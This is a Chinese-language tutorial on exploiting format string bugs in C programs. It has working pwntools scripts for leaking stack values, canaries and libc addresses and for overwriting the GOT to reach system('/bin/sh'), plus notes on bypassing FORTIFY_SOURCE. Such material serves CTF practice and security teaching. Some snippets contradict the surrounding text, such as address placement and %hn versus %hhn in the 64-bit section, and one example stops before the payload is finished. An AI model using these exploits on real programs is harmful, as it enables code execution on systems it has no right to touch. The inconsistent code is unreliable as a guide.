# 格式化字符串漏洞

## 原理

`printf(user_input)` 中用户控制格式化字符串→ 利用 `%p` 泄露栈内容，利用 `%n` 向栈地址写入字节数。

触发场景：直接传用户输入给 printf/sprintf/snprintf 而不指定格式。

```c
printf(buf);                    // 漏洞！
printf("%s", buf);              // 安全
```

## %n 任意写 / %p 泄露

| 格式符 | 作用 |
|--------|------|
| `%p` | 以十六进制输出指针（泄露栈地址） |
| `%x` | 输出无符号十六进制（可泄露出栈其他内容） |
| `%d` | 输出有符号十进制 |
| `%s` | 读取字符串（传入地址指针时读该地址字符串） |
| `%n` | **写入**当前已输出字符数到对应地址 |
| `%hn` | 写入 2 字节 |
| `%hhn` | 写入 1 字节 |

**%n 任意写**: `printf("AAAA%n")` 将 `4` 写入格式化串地址（偏移 1 的参数）。

## 栈布局利用

通过 `%N$n` 指定第 N 个参数（直接参数访问），精确定位到栈上某个地址。

```python
# 示例：向 GOT 表写入 system
addr = e.got['puts']
payload  = p32(addr)                # 写入目标地址
payload += b'%' + str(system_low) + b'c'  # 填充到 system 低字节值
payload += b'%10$n'                 # 写入 #10 参数位置（即 addr 所在栈槽）
```

### 覆盖 GOT

利用 `%n` 修改 `puts@got` 为 `system`，后续执行 `puts("/bin/sh")` → `system("/bin/sh")`。

### 覆盖返回地址

GOT 不可写（Full RELRO）时，覆盖栈上的返回地址跳 ROP。

## 64 位格式化字符串

x86_64 前 6 个参数在 RDI/RSI/RDX/RCX/R8/R9 寄存器中，格式化字符串参数起始于第 6 个参数（RDI 是格式化串本身）。

**定位偏移**: 输入 `AAAAAAAA%p.%p.%p...` 找 `0x4141414141414141` 出现位置。

```bash
# 32位: 输入 AAAA%x.%x.%x...
# 64位: 输入 AAAAAAAA%p.%p.%p...
# 找到 0x41414141 / 0x4141414141414141 的偏移
```

**地址写入差异**: 64 位地址含 `\x00` 字节（高位为 0），需将地址放在格式化串末尾。

```python
# 64 位分 2 字节写（%hn）避免 null 字节截断
payload  = p64(addr)       # 目标地址在开头
payload += p64(addr + 2)   # 地址 +2
payload += b'%Nc%N$hhn'    # 写入低 2 字节
payload += b'%Mc%M$hhn'    # 写入高 2 字节
```

## pwntools fmtstr_payload 自动生成

```python
from pwn import *
# 自动生成格式化字符串 payload
payload = fmtstr_payload(offset, {addr_to_write: value}, write_size='byte')
# offset: 格式串在栈中的参数位置
# addr_to_write: 目标地址
# value: 要写入的值

# 例：将 puts@got 覆写为 system@plt
payload = fmtstr_payload(10, {e.got['puts']: e.plt['system']})
```

**工作原理**: 自动计算每个字节的值，生成 `%Nc%N$hhn` 序列，按地址排序写入。

## 完整利用示例

```python
from pwn import *

e = ELF('./vuln')
p = process('./vuln')

# 找偏移
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p')
p.recvuntil(b'AAAA')

# 覆盖 GOT (32-bit)
puts_got = e.got['puts']
system_plt = e.plt['system']

payload = fmtstr_payload(6, {puts_got: system_plt})
p.sendline(payload)
p.interactive()
```

### 手动构造（64位，绕过 null 字节）

地址必须放在 payload 末尾（避免被 `\x00` 截断），用 `%N$hhn` 逐字节写：

```python
addr = e.got['puts']
val = e.symbols['win']  # 目标值 0x08049182

# 分解成 3 个字节
b0, b1, b2 = val & 0xff, (val >> 8) & 0xff, (val >> 16) & 0xff
writes = [(addr, b0), (addr+1, b1), (addr+2, b2)]
writes.sort(key=lambda x: x[1])  # 按值排序减少输出

# 构造 %Nc%M$hhn 链
payload = b''
for a, v in writes:
    payload += p32(a)  # 32-bit 示例
# 然后拼接格式化指示符...
```

## 多阶段利用

**阶段1**: 泄露 libc + canary + PIE 基址
**阶段2**: 构造 ROP chain 或 overwrite __malloc_hook

```python
# 泄露多值
payload = b'%7$p.%9$p.%15$p'  # 一次泄露 canary, PIE, libc
data = p.recvline().split(b'.')
canary = int(data[0], 16)
pie_leak = int(data[1], 16)
libc_leak = int(data[2], 16)
```

## 防御：FORTIFY_SOURCE

| 级别 | 编译选项 | 作用 |
|------|---------|------|
| 0 | `-D_FORTIFY_SOURCE=0` | 不启用 |
| 1 | `-D_FORTIFY_SOURCE=1` | 运行时检查 `%n` 在格式化串是否在 .rodata（仅编译期已知的格式串） |
| 2 | `-D_FORTIFY_SOURCE=2` | 额外检查栈缓冲区溢出 |

**绕过**: 格式化串不在 .rodata（运行时构造/pass from user input）时 FORTIFY 无效。

**编译检测**: `gcc -Wformat -Wformat-security` 可发现未指定格式符的 printf 调用。

## 实用技巧

| 操作 | 方法 |
|------|------|
| 计算参数偏移 | `%N$p` 直接访问第 N 个参数，用 AAAA 定位 |
| 泄露 canary | `%N$p` 打印 canary 所在偏移 |
| 泄露 libc | `%N$s` + GOT 地址，读取 libc 函数地址 |
| 一次写多字节 | 按地址排序，用 `%hn` 或 `%hhn` 分 2/1 字节写 |
| 大值写入 | 用 `%Nc` 精确控制计数，配合 `%hhn` 避免过大的输出 |
